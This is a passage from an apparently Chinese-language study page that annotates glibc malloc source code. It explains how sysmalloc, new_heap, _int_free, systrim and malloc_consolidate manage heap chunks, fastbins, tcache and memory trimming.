                    // 将外部调用 sbrk()分配的内存计入当前分配区所分配内存统计中
                    if (old_size)
                        av-&gt;system_mem += brk - old_end;

                    /* Guarantee alignment of first new chunk made from this space */
                    //  计算当前的 brk 要矫正的字节数据，保证 brk 地址按 MALLOC_ALIGNMENT 对齐
                    front_misalign = (INTERNAL_SIZE_T)chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;
                    if (front_misalign &gt; 0) {
                        /*
                           Skip over some bytes to arrive at an aligned position.
                           We don&#39;t need to specially mark these wasted front bytes.
                           They will never be accessed anyway because
                           prev_inuse of av-&gt;top (and any chunk created from its start)
                           is always true after initialization.
                         */

                        correction = MALLOC_ALIGNMENT - front_misalign;
                        aligned_brk += correction;
                    }

                    /*
                       If this isn&#39;t adjacent to existing space, then we will not
                       be able to merge with old_top space, so must add to 2nd request.
                     */
                    // 由于原 top chunk 的地址与当前 brk 不相邻，也就不能再使用原 top chunk 的内存了，需
                    // 要重新为所需 chunk 分配足够的内存，将原 top chunk 的大小加到矫正值中，从当前 brk 中
                    // 分配所需 chunk，计算出未对齐的 chunk 结束地址 end_misalign，然后将 end_misalign 按照
                    // 页对齐计算出需要矫正的字节数加到矫正值上。然后再调用 sbrk()分配矫正值大小的内存，
                    // 如果 sbrk()分配成功，则当前的 top chunk 中可以分配出所需的连续内存的 chunk
                    correction += old_size;

                    /* Extend the end address to hit a page boundary */
                    end_misalign = (INTERNAL_SIZE_T)(brk + size + correction);
                    correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;

                    assert(correction &gt;= 0);
                    snd_brk = (char *) (MORECORE(correction));

                    /*
                       If can&#39;t allocate correction, try to at least find out current
                       brk.  It might be enough to proceed without failing.

                       Note that if second sbrk did NOT fail, we assume that space
                       is contiguous with first sbrk. This is a safe assumption unless
                       program is multithreaded but doesn&#39;t use locks and a foreign sbrk
                       occurred between our first and second calls.
                     */
                    // 如果 sbrk()执行失败，更新当前 brk 的结束地址
                    if (snd_brk == (char *) (MORECORE_FAILURE)) {
                        correction = 0;
                        snd_brk = (char *) (MORECORE(0));
                    }
                    // 如果 sbrk()执行成功，并且有 morecore hook 函数存在，执行该 hook 函数
                    else {
                        /* Call the `morecore&#39; hook if necessary.  */
                        void (*hook)(void) = atomic_forced_read(__after_morecore_hook);
                        if (__builtin_expect(hook != NULL, 0))
                            (*hook)();
                    }
                }

                    /* handle non-contiguous cases */
                // 执行到这里，意味着 brk 是用 mmap()分配的
                else {
                    if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)
                        /* MORECORE/mmap must correctly align */
                        assert(((unsigned long) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == 0);
                    // 对齐操作
                    else {
                        front_misalign = (INTERNAL_SIZE_T)chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;
                        if (front_misalign &gt; 0) {
                            /*
                               Skip over some bytes to arrive at an aligned position.
                               We don&#39;t need to specially mark these wasted front bytes.
                               They will never be accessed anyway because
                               prev_inuse of av-&gt;top (and any chunk created from its start)
                               is always true after initialization.
                             */

                            aligned_brk += MALLOC_ALIGNMENT - front_misalign;
                        }
                    }

                    /* Find out current end of memory */
                    // 如果 brk 的结束地址非法，使用 morecore 获得当前 brk 的结束地址
                    if (snd_brk == (char *) (MORECORE_FAILURE)) {
                        snd_brk = (char *) (MORECORE(0));
                    }
                }

                /* Adjust top based on results of second sbrk */
                // 如果 brk 的结束地址合法，设置当前分配区的 top chunk 为 brk，
                // 设置 top chunk 的大小，并更新分配区的总分配内存量
                if (snd_brk != (char *) (MORECORE_FAILURE)) {
                    av-&gt;top = (mchunkptr) aligned_brk;
                    set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);
                    av-&gt;system_mem += correction;

                    /*
                       If not the first time through, we either have a
                       gap due to foreign sbrk or a non-contiguous region.  Insert a
                       double fencepost at old_top to prevent consolidation with space
                       we don&#39;t own. These fenceposts are artificial chunks that are
                       marked as inuse and are in any case too small to use.  We need
                       two to make sizes and alignments work out.
                     */
                    // 设置原 top chunk 的 fencepost，fencepost 需要 MINSIZE 大小的内存空间，将该 old_size
                    // 减去 MINSIZE 得到原 top chunk 的有效内存空间，我们可以确信原 top chunk 的有效内存空间
                    // 一定大于 MINSIZE，将原 top chunk 切分成空闲 chunk 和 fencepost 两部分，首先设置切分出
                    // 来的 chunk 的大小为 old_size，并标识前一个 chunk 处于 inuse 状态，原 top chunk 切分出来
                    // 的chunk本应处于空闲状态，但fencepost的第一个chunk却标识前一个chunk为inuse状态，
                    // 然后强制将该处于 inuse 状态的 chunk 调用_int_free()函数释放掉。然后设置 fencepost 的第
                    // 一个 chunk 的大小为 2*SIZE_SZ，并标识前一个 chunk 处于 inuse 状态，然后设置 fencepost
                    // 的第二个 chunk 的 size 为 2*SIZE_SZ，并标识前一个 chunk 处于 inuse 状态。这里的主分配区
                    // 的 fencepost 与非主分配区的 fencepost 不同，主分配区 fencepost 的第二个 chunk 的大小设
                    // 置为 2*SIZE_SZ，而非主分配区的 fencepost 的第二个 chunk 的大小设置为 0
                    if (old_size != 0) {
                        /*
                           Shrink old_top to insert fenceposts, keeping size a
                           multiple of MALLOC_ALIGNMENT. We know there is at least
                           enough space in old_top to do this.
                         */
                        old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;
                        set_head (old_top, old_size | PREV_INUSE);

                        /*
                           Note that the following assignments completely overwrite
                           old_top when old_size was previously MINSIZE.  This is
                           intentional. We need the fencepost, even if old_top otherwise gets
                           lost.
                         */
                        set_head (chunk_at_offset(old_top, old_size),
                                  (2 * SIZE_SZ) | PREV_INUSE);
                        set_head (chunk_at_offset(old_top, old_size + 2 * SIZE_SZ),
                                  (2 * SIZE_SZ) | PREV_INUSE);

                        /* If possible, release the rest. */
                        if (old_size &gt;= MINSIZE)
                        {
                            _int_free(av, old_top, 1);
                        }
                    }
                }
            }
        }
    } /* if (av !=  &amp;main_arena) */
    // 如果当前分配区所分配的内存量大于设置的最大值，更新当前分配区最大分配的内存量
    if ((unsigned long) av-&gt;system_mem &gt; (unsigned long) (av-&gt;max_system_mem))
        av-&gt;max_system_mem = av-&gt;system_mem;
    check_malloc_state (av);

    /* finally, do the allocation */
    p = av-&gt;top;
    size = chunksize (p);

    /* check that one of the above allocation paths succeeded */
    // 如果当前 top chunk 中已经有足够的内存来分配所需的 chunk，
    // 从当前的 top chunk 中分配所需的 chunk 并返回
    if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
    {
        remainder_size = size - nb;
        remainder = chunk_at_offset (p, nb);
        av-&gt;top = remainder;
        set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
        set_head (remainder, remainder_size | PREV_INUSE);
        check_malloced_chunk (av, p, nb);
        return chunk2mem (p);
    }

    /* catch all failure paths */
    __set_errno(ENOMEM);
    return 0;
}
</code></pre>
<h4 id="grow-heap"><a href="#grow-heap" class="headerlink" title="grow_heap"></a>grow_heap</h4><pre><code class="c">static int grow_heap (heap_info *h, long diff)
{
  size_t pagesize = GLRO (dl_pagesize);
  long new_size;

  diff = ALIGN_UP (diff, pagesize);
  new_size = (long) h-&gt;size + diff;
  if ((unsigned long) new_size &gt; (unsigned long) HEAP_MAX_SIZE)
    return -1;

  if ((unsigned long) new_size &gt; h-&gt;mprotect_size)
    {
      if (__mprotect ((char *) h + h-&gt;mprotect_size,
                      (unsigned long) new_size - h-&gt;mprotect_size,
                      PROT_READ | PROT_WRITE) != 0)
        return -2;

      h-&gt;mprotect_size = new_size;
    }

  h-&gt;size = new_size;
  LIBC_PROBE (memory_heap_more, 2, h, h-&gt;size);
  return 0;
}
</code></pre>
<h4 id="new-heap"><a href="#new-heap" class="headerlink" title="new_heap"></a>new_heap</h4><pre><code class="c">static heap_info *new_heap (size_t size, size_t top_pad)
{
  size_t pagesize = GLRO (dl_pagesize);
  char *p1, *p2;
  unsigned long ul;
  heap_info *h;

  /* 调整 size 的大小，size 的最小值为 32K,最大值 HEAP_MAX_SIZE 在不同 */
  /* 的系统上不同，在 32 位系统为 1M，64 位系统为 64M，将 size 的大小调 */
  /* 整到最小值与最大值之间，并以页对齐，如果 size 大于最大值，直接报错 */
  if (size + top_pad &lt; HEAP_MIN_SIZE)
    size = HEAP_MIN_SIZE;
  else if (size + top_pad &lt;= HEAP_MAX_SIZE)
    size += top_pad;
  else if (size &gt; HEAP_MAX_SIZE)
    return 0;
  else
    size = HEAP_MAX_SIZE;
  size = ALIGN_UP (size, pagesize);

  /* A memory region aligned to a multiple of HEAP_MAX_SIZE is needed.
     No swap space needs to be reserved for the following large
     mapping (on Linux, this is the case for all non-writable mappings
     anyway). */
  /* 全局变量 aligned_heap_area 是上一次调用 mmap 分配内存的结束虚拟地址，并已经按 */
  /* 照 HEAP_MAX_SIZE 大小对齐。如果 aligned_heap_area 不为空，尝试从上次映射结束 */
  /* 地址开始映射大小为 HEAP_MAX_SIZE 的内存块，由于全局变量 aligned_heap_area 没 */
  /* 有锁保护，可能存在多个线程同时 mmap()函数从 aligned_heap_area 开始映射新的虚拟 */
  /* 内存块，操作系统会保证只会有一个线程会成功，其它在同一地址映射新虚拟内存块都会失败。*/
  /* 无论映射是否成功，都将全局变量 aligned_heap_area 设置为 NULL。如果映射成功，但 */
  /* 返回的虚拟地址不是按 HEAP_MAX_SIZE 大小对齐的，取消该区域的映射，映射失败 */
  p2 = MAP_FAILED;
  if (aligned_heap_area)
    {
      p2 = (char *) MMAP (aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE,
                          MAP_NORESERVE);
      aligned_heap_area = NULL;
      if (p2 != MAP_FAILED &amp;&amp; ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1)))
        {
          __munmap (p2, HEAP_MAX_SIZE);
          p2 = MAP_FAILED;
        }
    }

  /* 全局变量 aligned_heap_area 是上一次调用 mmap 分配内存的结束虚拟地址，并已经按 */
  /* 照 HEAP_MAX_SIZE 大小对齐。如果 aligned_heap_area 不为空，尝试从上次映射结束 */  
  /* 地址开始映射大小为 HEAP_MAX_SIZE 的内存块，由于全局变量 aligned_heap_area 没有锁保护，可
能存在多个线程同时 mmap()函数从 aligned_heap_area 开始映射新的虚拟内存块，操作系统
会保证只会有一个线程会成功，其它在同一地址映射新虚拟内存块都会失败。无论映射是否
成功，都将全局变量 aligned_heap_area 设置为 NULL。如果映射成功，但返回的虚拟地址不
是按 HEAP_MAX_SIZE 大小对齐的，取消该区域的映射，映射失败。*/
  if (p2 == MAP_FAILED)
    {
      p1 = (char *) MMAP (0, HEAP_MAX_SIZE &lt;&lt; 1, PROT_NONE, MAP_NORESERVE);

      /* 映射 2 倍 HEAP_MAX_SIZE 大小的虚拟内存成功，将大于等于 p1 并按 HEAP_MAX_SIZE */
      /* 大小对齐的第一个虚拟地址赋值给 p2，p2 作为 sub_heap 的起始虚拟地址，p2+HEAP_MAX_SIZE */
      /* 作为 sub_heap 的结束地址，并将 sub_heap 的结束地址赋值给全局变量aligned_heap_area，*/
      /* 最后还需要将多余的虚拟内存还回给操作系统 */
      if (p1 != MAP_FAILED)
        {
          p2 = (char *) (((unsigned long) p1 + (HEAP_MAX_SIZE - 1))
                         &amp; ~(HEAP_MAX_SIZE - 1));
          ul = p2 - p1;
          if (ul)
            __munmap (p1, ul);
          else
            aligned_heap_area = p2 + HEAP_MAX_SIZE;
          __munmap (p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul);
        }
      else
        {
          /* Try to take the chance that an allocation of only HEAP_MAX_SIZE
             is already aligned. */
          /* 映射 2 倍 HEAP_MAX_SIZE 大小的虚拟内存失败了，再尝试映射 HEAP_MAX_SIZE */
          /* 大小的虚拟内存，如果失败，返回；如果成功，但该虚拟地址不是按照 HEAP_MAX_SIZE */
          /* 大小对齐的，返回 */
          p2 = (char *) MMAP (0, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);
          if (p2 == MAP_FAILED)
            return 0;

          if ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1))
            {
              __munmap (p2, HEAP_MAX_SIZE);
              return 0;
            }
        }
    }

  /* 调用 mprotect()函数将 size 大小的内存设置为可读可写，如果失败，*/
  /* 解除整个 sub_heap 的映射。然后更新 heap_info 实例中的相关字段 */
  if (__mprotect (p2, size, PROT_READ | PROT_WRITE) != 0)
    {
      __munmap (p2, HEAP_MAX_SIZE);
      return 0;
    }
  h = (heap_info *) p2;
  h-&gt;size = size;
  h-&gt;mprotect_size = size;
  LIBC_PROBE (memory_heap_new, 2, h, h-&gt;size);
  return h;
}
</code></pre>
<h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h3><pre><code class="c">/*
  free(void* p)
  Releases the chunk of memory pointed to by p, that had been previously
  allocated using malloc or a related routine such as realloc.
  It has no effect if p is null. It can have arbitrary (i.e., bad!)
  effects if p has already been freed.

  Unless disabled (using mallopt), freeing very large spaces will
  when possible, automatically trigger operations that give
  back unused memory to the system, thus reducing program footprint.
*/
void __libc_free(void *mem) {
    mstate ar_ptr;
    mchunkptr p;                          /* chunk corresponding to mem */

    // 如果存在 __free_hook 则执行其内容
    void (*hook)(void *, const void *)
    = atomic_forced_read(__free_hook);
    if (__builtin_expect(hook != NULL, 0)) {
        (*hook)(mem, RETURN_ADDRESS (0));
        return;
    }
    // free NULL
    if (mem == 0)                              /* free(0) has no effect */
        return;

    // 拿到程序指针
    p = mem2chunk (mem);

    // 如果 chunk 是 mmap 函数返回的，则使用 munmap_chunk 函数释放
    if (chunk_is_mmapped (p))                       /* release mmapped memory. */
    {
        /* See if the dynamic brk/mmap threshold needs adjusting.
       Dumped fake mmapped chunks do not affect the threshold.  */
        // 如果开启了mmap分配阈值动态调整机制
        // 如果当前 free 的 chunk 的大小大于设置的 mmap 分配阈值
        // 且小于 mmap 分配阈值的最大值
        if (!mp_.no_dyn_threshold
            &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold
            &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX
            &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) {
            // 将当前 chunk 的大小赋值给 mmap 分配阈值
            mp_.mmap_threshold = chunksize (p);
            // mmap 收缩阈值为 mmap分配阈值的 2 倍
            mp_.trim_threshold = 2 * mp_.mmap_threshold;
            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, 2,
                       mp_.mmap_threshold, mp_.trim_threshold);
        }
        //然后调用 munmap_chunk释放函数
        munmap_chunk(p);
        return;
    }

    MAYBE_INIT_TCACHE ();
    // 获得指向 arena 的指针
    ar_ptr = arena_for_chunk (p);
    // 使用 _int_free 释放 chunk
    _int_free(ar_ptr, p, 0);
}
</code></pre>
<h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><pre><code class="c">static void
_int_free(mstate av, mchunkptr p, int have_lock) {
    INTERNAL_SIZE_T size;        /* its size */
    mfastbinptr *fb;             /* associated fastbin */
    mchunkptr nextchunk;         /* next contiguous chunk */
    INTERNAL_SIZE_T nextsize;    /* its size */
    int nextinuse;               /* true if nextchunk is used */
    INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
    mchunkptr bck;               /* misc temp for linking */
    mchunkptr fwd;               /* misc temp for linking */

    // #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    // #define chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))
    // #define chunksize_nomask(p)         ((p)-&gt;mchunk_size)
    // 拿到去除标志位的 size
    size = chunksize (p);

    /* Little security check which won&#39;t hurt performance: the
       allocator never wrapps around at the end of the address space.
       Therefore we can exclude some size values which might appear
       here by accident or by &quot;design&quot; from some intruder.  */
    // 如果 chunk 的指针地址溢出
    // 或 chunk 并没有对齐
    if (__builtin_expect((uintptr_t) p &gt; (uintptr_t) - size, 0)
        || __builtin_expect(misaligned_chunk (p), 0))
        malloc_printerr(&quot;free(): invalid pointer&quot;);
    /* We know that each chunk is at least MINSIZE bytes in size or a
       multiple of MALLOC_ALIGNMENT.  */

    // 如果 size 小于 MINSIZE
    // 或者 size 没有对其
    if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK (size)))
    malloc_printerr(&quot;free(): invalid size&quot;);

    // 啥也没干
    check_inuse_chunk(av, p);

#if USE_TCACHE
    {
      // 拿到对应的 tcache 索引
      size_t tc_idx = csize2tidx (size);

      // 如果开启了 tcache
      // 且 索引没有超过出范围
      // 且 对应的 tcache 未满
      if (tcache
      &amp;&amp; tc_idx &lt; mp_.tcache_bins
      &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)
        {
          // 将该 chunk 放在对应的 tcache 里
          tcache_put (p, tc_idx);
          return;
        }
    }
#endif

    /*
      If eligible, place chunk on a fastbin so it can be found
      and used quickly in malloc.
    */
    // 如果 size 在 fastbin 的范围之内
    if ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast())

    // 如果设置了 TRIM_FASTBINS，不要将靠近顶部的块放入 fastbins
    // 但 TRIM_FASTBINS 默认为 0，即 top_chunk 不会合并与它相邻的 fastbin 块
#if TRIM_FASTBINS
        /*
      If TRIM_FASTBINS set, don&#39;t place chunks
      bordering top into fastbins
        */
        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)
#endif
            ) {
        // 检查下一个 chunk 的大小，不能小于 2 * SIZE_SZ ，也不能大于 av-&gt;system_mem,
        if (__builtin_expect(chunksize_nomask (chunk_at_offset(p, size))
                             &lt;= 2 * SIZE_SZ, 0)
            || __builtin_expect(chunksize (chunk_at_offset(p, size))
                                &gt;= av-&gt;system_mem, 0)) {
            bool fail = true;
            /* We might not have a lock at this point and concurrent modifications
               of system_mem might result in a false positive.  Redo the test after
               getting the lock.  */
            if (!have_lock) {
                __libc_lock_lock(av-&gt;mutex);
                fail = (chunksize_nomask (chunk_at_offset(p, size)) &lt;= 2 * SIZE_SZ
                        || chunksize (chunk_at_offset(p, size)) &gt;= av-&gt;system_mem);
                __libc_lock_unlock(av-&gt;mutex);
            }

            if (fail)
                malloc_printerr(&quot;free(): invalid next size (fast)&quot;);
        }
        // 释放之前将 chunk 填为 perturb_byte
        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);
        // 设立 have_fastchunks 标志位，表明 fastbin 中有值
        atomic_store_relaxed(&amp;av-&gt;have_fastchunks, true);
        // 拿到对应的 fastbin 索引
        unsigned int idx = fastbin_index(size);
        // 拿到第一个元素
        fb = &amp;fastbin (av, idx);

        /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */
        mchunkptr old = *fb, old2;

        if (SINGLE_THREAD_P) {
            /* Check that the top of the bin is not the record we are going to
               add (i.e., double free).  */
            // double free
            if (__builtin_expect(old == p, 0))
                malloc_printerr(&quot;double free or corruption (fasttop)&quot;);
            // 将新释放的 chunk 插入链中
            p-&gt;fd = old;
            *fb = p;
        } else
            do {
                /* Check that the top of the bin is not the record we are going to
                   add (i.e., double free).  */
                if (__builtin_expect(old == p, 0))
                    malloc_printerr(&quot;double free or corruption (fasttop)&quot;);
                p-&gt;fd = old2 = old;
            } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2))
                     != old2);

        /* Check that size of fastbin chunk at the top is the same as
           size of the chunk that we are adding.  We can dereference OLD
           only if we have the lock, otherwise it might have already been
           allocated again.  */
        // 检查 该 chunk 是否放对了地方
        if (have_lock &amp;&amp; old != NULL
            &amp;&amp; __builtin_expect(fastbin_index (chunksize(old)) != idx, 0))
            malloc_printerr(&quot;invalid fastbin entry (free)&quot;);
    }

        /*
          Consolidate other non-mmapped chunks as they arrive.
        */
    // size 不在 fastbin 内
    // chunk 不是 mmap 分配的
    else if (!chunk_is_mmapped(p)) {

        /* If we&#39;re single-threaded, don&#39;t lock the arena.  */
        if (SINGLE_THREAD_P)
            have_lock = true;

        if (!have_lock)
            __libc_lock_lock(av-&gt;mutex);

        // 拿到下一个 chunk
        nextchunk = chunk_at_offset(p, size);

        /* Lightweight tests: check whether the block is already the
           top block.  */
        // 如果释放的 chunk 是 top_chunk
        if (__glibc_unlikely(p == av-&gt;top))
            malloc_printerr(&quot;double free or corruption (top)&quot;);
        /* Or whether the next chunk is beyond the boundaries of the arena.  */
        // 下一个块超出了 arena 的边界
        if (__builtin_expect(contiguous (av)
                             &amp;&amp; (char *) nextchunk
                                &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))
            malloc_printerr(&quot;double free or corruption (out)&quot;);
        /* Or whether the block is actually not marked used.  */
        // 下一个 chunk 的 prev_inuse 标志位为 0，即前一个 chunk 已经被释放过了
        if (__glibc_unlikely(!prev_inuse(nextchunk)))
            malloc_printerr(&quot;double free or corruption (!prev)&quot;);

        // 拿到下一个 chunk 的 size
        nextsize = chunksize(nextchunk);
        // 如果 下一个 chunk 的 size 小于  2 * SIZE_SZ 或 大于 av-&gt;system_mem
        if (__builtin_expect(chunksize_nomask (nextchunk) &lt;= 2 * SIZE_SZ, 0)
            || __builtin_expect(nextsize &gt;= av-&gt;system_mem, 0))
            malloc_printerr(&quot;free(): invalid next size (normal)&quot;);
        // 将该 chunk 的 data 部分填充为 perturb_byte
        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);

        /* consolidate backward */
        // 如果释放块之前的块也是 free 的
        if (!prev_inuse(p)) {
            // 拿到上一个 chunk 的 size
            prevsize = prev_size (p);
            size += prevsize;
            // 拿到前一个 chunk
            p = chunk_at_offset(p, -((long) prevsize));
            // 将前一个 chunk 取消链接
            unlink(av, p, bck, fwd);
        }
        // 如果下一个 chunk 不为 top_chunk
        if (nextchunk != av-&gt;top) {
            /* get and clear inuse bit */
            // 查看下一个 chunk 是否为 释放状态
            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

            /* consolidate forward */
            // 如果下一个 chunk 也是释放状态
            if (!nextinuse) {
                // 将下一个 chunk 取消链接
                unlink(av, nextchunk, bck, fwd);
                size += nextsize;
            }
            // 如果下一个 chunk 仍处于使用状态
            else
                // 清除下一个 chunk 的 prev_inuse 位
                clear_inuse_bit_at_offset(nextchunk, 0);

            /*
          Place the chunk in unsorted chunk list. Chunks are
          not placed into regular bins until after they have
          been given one chance to be used in malloc.
            */
            // 拿到 unsorter_bin
            bck = unsorted_chunks(av);
            // 拿到链上的第一个 chunk
            fwd = bck-&gt;fd;
            // 检查双向链接完整性
            if (__glibc_unlikely(fwd-&gt;bk != bck))
                malloc_printerr(&quot;free(): corrupted unsorted chunks&quot;);
            // 将释放的 chunk 加入链中
            p-&gt;fd = fwd;
            p-&gt;bk = bck;
            // 如果 size 在 lage_bin 的范围之中
            // 清除 nextsize 域
            if (!in_smallbin_range(size)) {
                p-&gt;fd_nextsize = NULL;
                p-&gt;bk_nextsize = NULL;
            }
            // 完成链接
            bck-&gt;fd = p;
            fwd-&gt;bk = p;
            // 设立 标志位
            set_head(p, size | PREV_INUSE);
            set_foot(p, size);

            // 啥也没干
            check_free_chunk(av, p);
        }

            /*
              If the chunk borders the current high end of memory,
              consolidate into top
            */
        // 与 top_chunk 进行合并
        else {
            size += nextsize;
            set_head(p, size | PREV_INUSE);
            av-&gt;top = p;
            check_chunk(av, p);
        }

        /*
          If freeing a large space, consolidate possibly-surrounding
          chunks. Then, if the total unused topmost memory exceeds trim
          threshold, ask malloc_trim to reduce top.

          Unless max_fast is 0, we don&#39;t know if there are fastbins
          bordering top, so we cannot tell for sure whether threshold
          has been reached unless fastbins are consolidated.  But we
          don&#39;t want to consolidate on each free.  As a compromise,
          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD
          is reached.
        */
        // 如果 size 大于 FASTBIN_CONSOLIDATION_THRESHOLD
        if ((unsigned long) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) {
            // 如果 fastbin 中有空闲的 chunk
            if (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))
                // 触发 malloc_consolidate
                malloc_consolidate(av);
            // 如果此时的 arena 为 main_arena
            if (av == &amp;main_arena) {
#ifndef MORECORE_CANNOT_TRIM
                // 如果 top_chunk 的 size 大于 heap的收缩阈值
                if ((unsigned long) (chunksize(av-&gt;top)) &gt;=
                    (unsigned long) (mp_.trim_threshold))
                    systrim(mp_.top_pad, av);
#endif
            } else {
                /* Always try heap_trim(), even if the top chunk is not
                   large, because the corresponding heap might go away.  */
                // 收缩非主分配区
                heap_info *heap = heap_for_ptr(top(av));

                assert(heap-&gt;ar_ptr == av);
                heap_trim(heap, mp_.top_pad);
            }
        }

        if (!have_lock)
            __libc_lock_unlock(av-&gt;mutex);
    }
        /*
          If the chunk was allocated via mmap, release via munmap().
        */
    // 该 chunk 是 mmap 分配的
    else {
        munmap_chunk(p);
    }
}
</code></pre>
<h4 id="systrim"><a href="#systrim" class="headerlink" title="systrim"></a>systrim</h4><pre><code class="c">/*
   systrim is an inverse of sorts to sysmalloc.  It gives memory back
   to the system (via negative arguments to sbrk) if there is unused
   memory at the `high&#39; end of the malloc pool. It is called
   automatically by free() when top space exceeds the trim
   threshold. It is also called by the public malloc_trim routine.  It
   returns 1 if it actually released any memory, else 0.
 */

static int systrim(size_t pad, mstate av) {
    long top_size;         /* Amount of top-most memory */
    long extra;            /* Amount to release */
    long released;         /* Amount actually released */
    char *current_brk;     /* address returned by pre-check sbrk call */
    char *new_brk;         /* address returned by post-check sbrk call */
    size_t pagesize;
    long top_area;

    pagesize = GLRO(dl_pagesize);
    top_size = chunksize (av-&gt;top);

    top_area = top_size - MINSIZE -1;
    if (top_area &lt;= pad)
        return 0;

    /* Release in pagesize units and round down to the nearest page.  */
    extra = ALIGN_DOWN(top_area - pad, pagesize);

    if (extra == 0)
        return 0;

    /*
       Only proceed if end of memory is where we last set it.
       This avoids problems if there were foreign sbrk calls.
     */
    current_brk = (char *) (MORECORE(0));
    if (current_brk == (char *) (av-&gt;top) + top_size) {
        /*
           Attempt to release memory. We ignore MORECORE return value,
           and instead call again to find out where new end of memory is.
           This avoids problems if first call releases less than we asked,
           of if failure somehow altered brk value. (We could still
           encounter problems if it altered brk in some very bad way,
           but the only thing we can do is adjust anyway, which will cause
           some downstream failure.)
         */

        MORECORE(-extra);
        /* Call the `morecore&#39; hook if necessary.  */
        void (*hook)(void) = atomic_forced_read(__after_morecore_hook);
        if (__builtin_expect(hook != NULL, 0))
            (*hook)();
        new_brk = (char *) (MORECORE(0));

        LIBC_PROBE(memory_sbrk_less, 2, new_brk, extra);

        if (new_brk != (char *) MORECORE_FAILURE) {
            released = (long) (current_brk - new_brk);

            if (released != 0) {
                /* Success. Adjust top. */
                av-&gt;system_mem -= released;
                set_head (av-&gt;top, (top_size - released) | PREV_INUSE);
                check_malloc_state (av);
                return 1;
            }
        }
    }
    return 0;
}
</code></pre>
<h4 id="munmap-chunk"><a href="#munmap-chunk" class="headerlink" title="munmap_chunk"></a>munmap_chunk</h4><pre><code class="c">static void munmap_chunk(mchunkptr p) {
    INTERNAL_SIZE_T size = chunksize (p);

    assert(chunk_is_mmapped (p));

    /* Do nothing if the chunk is a faked mmapped chunk in the dumped
       main arena.  We never free this memory.  */
    if (DUMPED_MAIN_ARENA_CHUNK (p))
        return;

    uintptr_t block = (uintptr_t) p - prev_size (p);
    size_t total_size = prev_size (p) + size;
    /* Unfortunately we have to do the compilers job by hand here.  Normally
       we would test BLOCK and TOTAL-SIZE separately for compliance with the
       page size.  But gcc does not recognize the optimization possibility
       (in the moment at least) so we combine the two values into one before
       the bit test.  */
    if (__builtin_expect(((block | total_size) &amp; (GLRO(dl_pagesize) - 1)) != 0, 0))
        malloc_printerr(&quot;munmap_chunk(): invalid pointer&quot;);

    atomic_decrement(&amp;mp_.n_mmaps);
    atomic_add(&amp;mp_.mmapped_mem, -total_size);

    /* If munmap failed the process virtual memory address space is in a
       bad shape.  Just leave the block hanging around, the process will
       terminate shortly anyway since not much can be done.  */
    __munmap((char *) block, total_size);
}
</code></pre>
<h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><pre><code class="c">/*
  ------------------------- malloc_consolidate -------------------------

  malloc_consolidate is a specialized version of free() that tears
  down chunks held in fastbins.  Free itself cannot be used for this
  purpose since, among other things, it might place chunks back onto
  fastbins.  So, instead, we need to use a minor variant of the same
  code.
*/
static void malloc_consolidate(mstate av) {
    mfastbinptr *fb;                 /* current fastbin being consolidated */
    mfastbinptr *maxfb;              /* last fastbin (for loop control) */
    mchunkptr p;                  /* current chunk being consolidated */
    mchunkptr nextp;              /* next chunk to consolidate */
    mchunkptr unsorted_bin;       /* bin header */
    mchunkptr first_unsorted;     /* chunk to link to */

    /* These have same use as in free() */
    mchunkptr nextchunk;
    INTERNAL_SIZE_T size;
    INTERNAL_SIZE_T nextsize;
    INTERNAL_SIZE_T prevsize;
    int nextinuse;
    mchunkptr bck;
    mchunkptr fwd;

    // 清除 have_fastchunks 标志位
    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, false);
    // 拿到 unsorted_bin
    unsorted_bin = unsorted_chunks(av);

    /*
      Remove each chunk from fast bin and consolidate it, placing it
      then in unsorted bin. Among other reasons for doing this,
      placing in unsorted bin avoids needing to calculate actual bins
      until malloc is sure that chunks aren&#39;t immediately going to be
      reused anyway.
    */
    // 拿到最大的 fastbin entry 地址
    maxfb = &amp;fastbin (av, NFASTBINS - 1);
    // 拿到最小的 fastbin entry 地址
    fb = &amp;fastbin (av, 0);
    do {
        // 替换 p 的值为 fb
        p = atomic_exchange_acq(fb, NULL);
        // 如果 p 不为 null
        if (p != 0) {
            do {
                {
                    // 根据 size 拿到对应的 fastbin 索引
                    unsigned int idx = fastbin_index (chunksize(p));
